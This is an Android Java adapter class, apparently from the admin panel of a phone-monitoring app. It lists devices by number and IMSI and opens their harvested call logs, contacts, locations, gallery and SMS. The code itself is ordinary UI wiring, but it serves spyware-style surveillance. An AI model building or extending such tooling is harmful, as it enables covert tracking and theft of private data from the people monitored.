package com.piramidsoft.wablastadmin.Adapter;

import android.app.AlertDialog;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.support.v7.widget.RecyclerView;
import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.LinearLayout;
import android.widget.TextView;

import com.piramidsoft.wablastadmin.ContactActivity;
import com.piramidsoft.wablastadmin.GalleryActivity;
import com.piramidsoft.wablastadmin.LocationActivity;
import com.piramidsoft.wablastadmin.LogCallActivity;
import com.piramidsoft.wablastadmin.Model.LogModel;
import com.piramidsoft.wablastadmin.Model.SpyModel;
import com.piramidsoft.wablastadmin.ProcessActivity;
import com.piramidsoft.wablastadmin.R;
import com.piramidsoft.wablastadmin.SmsActivity;
import com.piramidsoft.wablastadmin.Utils.AndLog;

import java.util.ArrayList;

import butterknife.BindView;
import butterknife.ButterKnife;

/**
 * Created by Ayo Maju on 10/07/2018.
 * Updated by Muhammad Iqbal on 10/07/2018.
 */

public class SpyAdapter extends RecyclerView.Adapter<SpyAdapter.LogHolder> {



    private ArrayList<SpyModel> arrayList;
    private Context context;

    public SpyAdapter(ArrayList<SpyModel> arrayList, Context context) {
        this.arrayList = arrayList;
        this.context = context;
    }

    @Override
    public LogHolder onCreateViewHolder(ViewGroup parent, int viewType) {
        LayoutInflater inflater = LayoutInflater.from(parent.getContext());
        View view = inflater.inflate(R.layout.item_spy, parent, false);
        return new LogHolder(view);
    }

    @Override
    public void onBindViewHolder(LogHolder holder, final int position) {
        holder.etNomor.setText(arrayList.get(position).getNomor());
        holder.etImsi.setText(arrayList.get(position).getImsi());
        holder.etStatus.setText(arrayList.get(position).getStatus());

        holder.lyParent.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                final String[] Choose = {"Log Call", "Contact", "Location", "Gallery", "SMS"};

                AlertDialog.Builder builder = new AlertDialog.Builder(context);
                builder.setTitle("Pilih Aksi");
                builder.setItems(Choose, new DialogInterface.OnClickListener() {
                    @Override
                    public void onClick(DialogInterface dialog, int which) {
                        // the user clicked on colors[which]
                        Intent intent;
                        String tabel, imsi;

                        switch (which) {
                            case 0:
                                Choose[0] = "Log Call";
                                intent = new Intent(context, LogCallActivity.class);
                                imsi = arrayList.get(position).getImsi();
                                intent.putExtra("tabel", "wasap_call");
                                intent.putExtra("imsi", imsi);
                                AndLog.ShowLog("dsd", imsi);
                                context.startActivity(intent);
                                break;
                            case 1:
                                Choose[1] = "Contact";
                                intent = new Intent(context, ContactActivity.class);
                                imsi = arrayList.get(position).getImsi();
                                intent.putExtra("tabel", "wasap_kontak");
                                intent.putExtra("imsi", imsi);
                                AndLog.ShowLog("dsd", imsi);
                                context.startActivity(intent);
                                break;

                            case 2:
                                Choose[2] = "Location";
                                intent = new Intent(context, LocationActivity.class);
                                imsi = arrayList.get(position).getImsi();
                                intent.putExtra("tabel", "wasap_lokasi");
                                intent.putExtra("imsi", imsi);
                                AndLog.ShowLog("dsd", imsi);
                                context.startActivity(intent);
                                break;
                            case 3:
                                Choose[3] = "Gallery";
                                intent = new Intent(context, GalleryActivity.class);
                                imsi = arrayList.get(position).getImsi();
                                intent.putExtra("tabel", "wasap_galeri");
                                intent.putExtra("imsi", imsi);
                                AndLog.ShowLog("dsd", imsi);
                                context.startActivity(intent);
                                break;
                            case 4:
                                Choose[4] = "SMS";
                                intent = new Intent(context, SmsActivity.class);
                                imsi = arrayList.get(position).getImsi();
                                intent.putExtra("tabel", "wasap_sms");
                                intent.putExtra("imsi", imsi);
                                AndLog.ShowLog("dsd", imsi);
                                context.startActivity(intent);
                                break;

                        }
                    }
                });
                builder.show();

            }
        });
    }

    @Override
    public int getItemCount() {
        return arrayList.size();
    }

    public class LogHolder extends RecyclerView.ViewHolder {
        @BindView(R.id.etNomor)
        TextView etNomor;
        @BindView(R.id.etImsi)
        TextView etImsi;
        @BindView(R.id.etStatus)
        TextView etStatus;
        @BindView(R.id.lyParent)
        LinearLayout lyParent;

        public LogHolder(View itemView) {
            super(itemView);
            ButterKnife.bind(this, itemView);
        }
    }
}
